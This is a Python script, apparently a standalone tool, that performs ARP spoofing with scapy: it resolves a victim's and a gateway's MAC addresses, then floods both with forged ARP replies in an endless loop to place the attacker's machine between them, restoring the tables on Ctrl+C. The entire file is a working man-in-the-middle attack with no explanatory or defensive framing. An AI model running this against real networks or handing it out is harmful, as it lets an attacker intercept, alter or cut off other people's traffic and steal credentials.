#!/usr/bin/env python

import sys
import os
sys.stderr = None 
from scapy.all import *
sys.stderr = sys.__stderr__
import netifaces

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_gateway_ip():
	try:
		gateways = netifaces.gateways()
		default_gateway = gateways['default'][netifaces.AF_INET][0]
		return default_gateway
	except (KeyError, IndexError):
		return None

def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = Ether(dst = dest_mac,src = get_if_hwaddr(conf.iface)) / ARP(op=1, hwsrc=get_if_hwaddr(conf.iface), psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = Ether(dst = dest_mac,src = source_mac) / ARP(op=1, hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(packet, verbose=False)

def main():
	try:
		check_root()
		victim_ip = sys.argv[1]
		if len(sys.argv) > 2:
			router_ip = sys.argv[2]
		else:
			router_ip = get_gateway_ip()

		victim_mac = getmacbyip(victim_ip)
		router_mac = getmacbyip(router_ip)

		print("Sending spoofed ARP packets")
		print("Router IP:", router_ip)
		print("Target IP:", victim_ip)
		print("To stop press CTRL+C")

		while True:
			arp_spoof(victim_ip, victim_mac, router_ip)
			arp_spoof(router_ip, router_mac, victim_ip)

	except KeyboardInterrupt:
		print("\nRestoring ARP Tables")
		arp_restore(router_ip, router_mac, victim_ip, victim_mac)
		arp_restore(victim_ip, victim_mac, router_ip, router_mac)
	finally:
		print("Script has been stopped.")


if __name__ == "__main__":
	main()	
